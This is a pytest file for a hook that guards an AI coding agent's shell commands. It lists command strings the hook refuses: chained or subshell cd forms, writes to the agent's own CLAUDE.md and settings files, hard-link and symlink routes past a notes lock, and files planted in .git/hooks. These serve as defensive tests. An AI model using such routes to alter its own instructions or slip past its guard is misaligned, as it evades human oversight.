# probed on a live host (Claude Code 2.1.289): neither Bash allow nor the hook's "allow" lifts it; cd as one call,
# then the command as the next — no card (Bash keeps the directory, the hook event's cwd is already the new one)

CD_WHY = "cd — только отдельным вызовом"
CD_COMPOUNDS = [  # (command, the event's cwd)
    (f"cd {CLONE} && git status --short", A),
    (f"cd {A} && backlog task edit KD-1 --append-notes x", CLONE),
    # allowed before: the directory changed through &&
    (f"cd {CLONE} && pytest -q", None),
    (f"cd {CLONE} && git log > /dev/null", None),
    (f"cd {CLONE} && sed -i s/a/b/ a.py", None),
    ("cd work/DigiPaddock && echo x > a.py", None),
    ("cd tests && echo x > a.py", CLONE),
    (f"cd {A}/work/tmp && echo x > kd-reply-12.md", CLONE),
    ("cd tests &&\n echo x > a.py", CLONE),
    ("cd tests \\\n && echo x > a.py", CLONE),
    ("cd tests && pytest -q > /srv/digipaddock-agents/dev/work/tmp/kd-x 2>&1 && echo x > a.py", CLONE),
    ("cd tests && pytest -q 2>&1 | tail -n 3 && echo x > a.py", CLONE),
    ("cd tests > /dev/null && echo x > a.py", CLONE),
    ("(cd tests && echo x > a.py)", CLONE),
    # any form of the chain
    ("cd tests; git status", CLONE),
    ("git status && cd tests", CLONE),
    ("git status\ncd tests", CLONE),
    ("cd tests | cat", CLONE),
    ("cd tests &", CLONE),
    ("cd tests && cd ..", CLONE),
    ("{ cd tests; git status; }", CLONE),
    ("echo $(cd .. && pwd)", CLONE),
    ("echo \"$(cd .. && pwd)\"", CLONE),
    ("echo `cd ..`", CLONE),
    ("cd \"$(git rev-parse --show-toplevel)\"", CLONE),
    ("cd $(git rev-parse --show-toplevel)", CLONE),
    ("pushd tests && pytest -q", CLONE),
    ("popd; git status", CLONE),
    ("! cd tests && git status", CLONE),
    ("builtin cd tests && git status", CLONE),
]


@pytest.mark.parametrize("command,cwd", CD_COMPOUNDS)
def test_cd_combined_with_anything_blocked(command, cwd):
    reason = guard.decide(command, cwd=cwd)
    assert reason is not None and CD_WHY in reason, (command, reason)


CD_SEPARATE = [  # (command, the event's cwd): the same as separate calls
    (f"cd {CLONE}", A),
    ("git status --short", CLONE),
    (f"cd {A}", CLONE),
    ("backlog task edit KD-1 --append-notes x", A),
    ("cd tests", CLONE),
    ("echo x > a.py", f"{CLONE}/tests"),
    ("pytest -q > /srv/digipaddock-agents/dev/work/tmp/kd-x 2>&1 && echo x > a.py", f"{CLONE}/tests"),
    ("pytest -q 2>&1 | tail -n 3 && echo x > a.py", f"{CLONE}/tests"),
    ("cd tests > /dev/null", CLONE),
    (f"cd {A}/work/tmp", CLONE),
    ("echo x > kd-reply-12.md", f"{A}/work/tmp"),
    ("cd", CLONE),
    ("cd ..", CLONE),
    ("cd tests # в тесты", CLONE),
    ("pushd tests", CLONE),
    ("popd", CLONE),
    # cd in text is data, not a command
    ("git commit -m 'fix: cd X && Y — отказ стража'", CLONE),
    ("backlog task edit KD-1 --append-notes \"[dev] cd X; Y теперь отказ\"", A),
    ("echo cd tests && git status", CLONE),
]


@pytest.mark.parametrize("command,cwd", CD_SEPARATE)
def test_cd_as_own_call_allowed(command, cwd):
    assert guard.decide(command, cwd=cwd) is None, command


def test_lone_cd_keeps_other_checks():
    assert "секрет" in guard.decide("cd /etc/digipaddock/forge", cwd=CLONE)
    assert "запис" in guard.decide(f"cd tests > {A}/CLAUDE.md", cwd=CLONE)


HOOK = Path(__file__).resolve().parent.parent / "bin" / "deny_guard.py"


@pytest.mark.parametrize("command,code", [("git status", 0), ("git push", 2), ("kd-forge merge digipaddock 1 x", 2)])
def test_entry_point_as_claude_code_runs_it(command, code):
    ev = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": CLONE})
    proc = subprocess.run([sys.executable, "-I", str(HOOK)], input=ev, capture_output=True, text=True, encoding="utf-8")
    assert proc.returncode == code, proc.stderr


def test_entry_point_with_broken_import_blocks(tmp_path):
    lone = tmp_path / "deny_guard.py"  # outside the package: import dev_agent will fail
    lone.write_text(HOOK.read_text(encoding="utf-8"), encoding="utf-8")
    proc = subprocess.run([sys.executable, "-I", str(lone)], input=json.dumps({"tool_input": {"command": "ls"}}),
                          capture_output=True, text=True, encoding="utf-8")
    assert proc.returncode == 2 and "не загрузился" in proc.stderr


# --- work/ is the session's cwd; CLAUDE.md and CLAUDE.local.md in its root are the agent's instructions -----------

WORK = f"{A}/work"
WORK_MEMORY_BAD = [  # (command, the event's cwd)
    (f"echo x > {WORK}/CLAUDE.md", None),
    (f"echo x >> {WORK}/CLAUDE.local.md", None),
    (f"tee {WORK}/CLAUDE.md", CLONE),
    (f"cp {A}/work/tmp/kd-x.md {WORK}/CLAUDE.md", CLONE),
    (f"mv {WORK}/CLAUDE.md {A}/work/tmp/kd-old.md", CLONE),        # removing a stub is a write too
    (f"rm -f {WORK}/CLAUDE.md", CLONE),
    (f"ln -sf {A}/work/tmp/kd-x.md {WORK}/CLAUDE.md", CLONE),
    (f"ln -s {WORK}/CLAUDE.md {A}/work/tmp/kd-l", CLONE),            # a later write to the link is a write to the stub
    (f"sed -i s/a/b/ {WORK}/CLAUDE.md", CLONE),
    (f"touch {WORK}/CLAUDE.local.md", CLONE),
    ("echo x > CLAUDE.md", WORK),                                  # relative to the event's cwd
    ("echo x > ../CLAUDE.md", CLONE),
    ("rm -f C*", WORK),                                            # a glob in the root of work/ covers the stub
    (f"rm -f {WORK}/*.md", CLONE),
]


@pytest.mark.parametrize("command,cwd", WORK_MEMORY_BAD)
def test_work_root_claude_md_is_not_writable(command, cwd):
    reason = guard.decide(command, cwd=cwd)
    assert reason is not None and "CLAUDE.md" in reason and "запис" in reason, (command, reason)


@pytest.mark.parametrize("command,cwd", [
    (f"echo x > {WORK}/.mcp.json", None), (f"mkdir {WORK}/.claude", None), ("echo x > .claude/settings.json", WORK),
    (f"cp {A}/work/tmp/kd-x {WORK}/.claude/settings.local.json", CLONE),
])
def test_work_root_claude_dir_and_mcp_are_not_writable(command, cwd):
    reason = guard.decide(command, cwd=cwd)
    assert reason is not None and (".claude" in reason or ".mcp.json" in reason), (command, reason)


@pytest.mark.parametrize("command,cwd", [
    (f"echo x >> {CLONE}/CLAUDE.md", None),          # the agent edits the clone's CLAUDE.md in a PR
    ("sed -i s/a/b/ CLAUDE.md", CLONE),
    (f"echo x > {CLONE}/agents/dev/CLAUDE.md", None),
    ("rm -f *.pyc", CLONE),
    (f"rm -f {WORK}/*.pyc", CLONE),                  # a glob that does not cover a stub
])
def test_clone_claude_md_stays_editable(command, cwd):
    assert guard.decide(command, cwd=cwd) is None, command


# --- Bash runs in the sandbox, /tmp cannot be written from it — command output goes to tmp/ of the agent's folder --

def test_bash_writes_go_to_agent_tmp_not_slash_tmp():
    assert "/tmp/kd-" not in guard.WRITE_WHY and f"{A}/work/tmp/" in guard.WRITE_WHY
    for command in ("pytest -q > /tmp/kd-pytest.txt", "git diff HEAD~1 > /tmp/kd-diff.txt", "tee /tmp/kd-x"):
        reason = guard.decide(command, cwd=CLONE)
        assert reason == guard.WRITE_WHY, (command, reason)
    assert guard.decide(f"pytest -q > {A}/work/tmp/kd-pytest.txt", cwd=CLONE) is None


# --- the session's own notes; the shared notes only through kd-notes add ------------------------------

@pytest.mark.parametrize("command", [f"tee {A}/memory/notes.md", f"echo x >> {A}/memory/notes.md",
                                     f"cp /dev/null {A}/memory/notes.md", "echo x > ../memory/notes.md",
                                     # review: a hard link in the own notes would write the same file past the lock
                                     f"ln {A}/memory/notes.md {A}/memory/tasks/KD-12.md",
                                     f"cp -l {A}/memory/notes.md {A}/memory/tasks/KD-12.md",
                                     f"cp --link {A}/memory/legacy/notes-1.md {A}/work/tmp/x.md",
                                     f"ln -s {A}/memory/notes.md {A}/work/tmp/n.md"])
def test_the_shared_notes_are_written_only_by_kd_notes(command):
    reason = guard.decide(command, cwd=f"{A}/work")
    assert reason == guard.SHARED_NOTES_WHY, (command, reason)


@pytest.mark.parametrize("command", [f"echo x > {A}/memory/legacy/notes-1.md", f"rm {A}/memory/legacy/migration.json"])
def test_the_split_is_not_written(command):
    assert guard.decide(command, cwd=CLONE) == guard.SHARED_NOTES_WHY


def test_other_memory_files_are_not_written_and_reading_the_shared_notes_is_fine():
    assert guard.decide(f"echo x > {A}/memory/other.md", cwd=CLONE) == guard.WRITE_WHY
    assert guard.decide(f"cp {A}/memory/notes.md {A}/work/tmp/cards/KD-12/copy.md", cwd=CLONE) is None


# --- C05: slot mode from KD_WORKER_SLOT (the worker's unit environment) ---------------------------------------

SLOT = "/srv/digipaddock-workers/dev/worker1"


def reload_guard(monkeypatch, slot):
    import importlib
    if slot is None:
        monkeypatch.delenv("KD_WORKER_SLOT", raising=False)
    else:
        monkeypatch.setenv("KD_WORKER_SLOT", slot)
    return importlib.reload(guard)


def hook(mod, command, run_in_background=False, cwd=None):
    event = {"tool_name": "Bash", "tool_input": {"command": command, "run_in_background": run_in_background}, "cwd": cwd}
    err = io.StringIO()
    code = mod.main(stdin=io.StringIO(json.dumps(event)), stderr=err, stdout=io.StringIO(), after_bash=lambda e: None)
    return code, err.getvalue()


def test_slot_mode_writes_only_in_the_slots_repo_and_tmp(monkeypatch):
    mod = reload_guard(monkeypatch, SLOT)
    try:
        assert hook(mod, f"echo x > {SLOT}/work/repo/a.py")[0] == 0
        assert hook(mod, f"echo x > {SLOT}/work/tmp/out.txt")[0] == 0
        assert hook(mod, f"echo x > {A}/work/DigiPaddock/a.py")[0] == 2
        assert hook(mod, f"tee {A}/memory/notes.md")[0] == 2
        assert hook(mod, f"echo x > {SLOT}/work/CLAUDE.md")[0] == 2
        # review 04.11.2026: the copy only — not the slot's other folders, not the copy's .git
        assert hook(mod, f"echo x > {SLOT}/work/other.txt")[0] == 2
        assert hook(mod, "echo x > .git/hooks/post-commit", cwd=f"{SLOT}/work/repo")[0] == 2
        assert hook(mod, f"cp a {SLOT}/work/repo/.git/config")[0] == 2
        assert hook(mod, f"echo x > {SLOT}/work/repo/.github/ci.yml")[0] == 0
    finally:
        reload_guard(monkeypatch, None)


@pytest.mark.parametrize("command", [
    f"printf x >> {A}/work/DigiPaddock/.git/config",
    f"sed -i s/a/b/ {A}/work/DigiPaddock/.git/config",
    f"cp h {A}/work/DigiPaddock/.git/hooks/reference-transaction",
    f"tee {A}/work/DigiPaddock.KD-12/.git",
])
def test_the_developer_writes_no_clones_git_dir_by_hand(command):
    """Review 04.11.2026: .git/ is git's own writing; a hook or a config written there by hand is refused."""
    assert hook(guard, command)[0] == 2
    assert hook(guard, f"echo x > {A}/work/DigiPaddock/.gitignore")[0] == 0


def test_slot_mode_refuses_background_commands(monkeypatch):
    mod = reload_guard(monkeypatch, SLOT)
    try:
        code, err = hook(mod, "pytest -q", run_in_background=True)
        assert code == 2 and "foreground" in err
    finally:
        mod = reload_guard(monkeypatch, None)
    assert hook(mod, "pytest -q", run_in_background=True)[0] == 0  # the developer may


@pytest.mark.parametrize("bad", ["/srv/digipaddock-workers/dev/worker1/", "/tmp/x", "/srv/digipaddock-workers/dev/worker10", "../x"])
def test_a_malformed_slot_variable_is_ignored(monkeypatch, bad):
    mod = reload_guard(monkeypatch, bad)
    try:
        assert mod.WORK == f"{A}/work"
    finally:
        reload_guard(monkeypatch, None)


# --- two sessions on two cards, a worktree per card ---------------------------------------------------------

@pytest.mark.parametrize("command", [
    "git worktree add ../DigiPaddock.KD-12 -b agent/KD-12-x origin/main",
    "git worktree list",
    "git worktree remove ../DigiPaddock.KD-12",
    f"cd {A}/work/DigiPaddock.KD-12",
    f"echo x > {A}/work/DigiPaddock.KD-12/a.py",
])
def test_guard_allows_git_worktree_in_work(command):
    assert guard.decide(command, cwd=CLONE) is None, command


def test_forge_subcommands_are_the_capabilitys():
    """the guard, the wrapper and the generated policy name the same kd-forge forms (publish included)."""
    import json
    from pathlib import Path
    cap = json.loads((Path(__file__).resolve().parents[3] / "common/agent-capabilities/forge.review.json")
                     .read_text(encoding="utf-8"))
    forms = next(w["subcommands"] for w in cap["wrappers"] if w["command"] == "kd-forge")
    assert "publish" in forms and set(forms) | {"-h", "--help"} == guard.FORGE_SUBCOMMANDS
    assert "kd-forge merge" in guard.decide(f"kd-forge merge digipaddock 12 {S}")
    # status reads the checks of a commit (the merged one: the deploy that runs after the merge)
    assert "status" in forms and guard.decide("kd-forge status api 02330b40") is None
    assert guard.decide(f"kd-forge status api {S}") is None


def test_a_flowchart_block_in_an_argument_is_refused_so_the_devs_diagram_is_turn_text():
    # between the block's backticks the guard reads `[…]` and `{…}` as an expansion; the dev's instructions
    # say a diagram goes into the turn's text (agents/dev/CLAUDE.md), and a plain backtick name still passes
    block = "```mermaid\nflowchart TD\n  A[Запрос] --> B{Тип?}\n```"
    assert guard.decide("kd-task comment KD-1 '" + block + "'") is not None
    assert guard.decide("kd-task comment KD-1 'поле `account_type` в `lib/partner_repo.py`'") is None
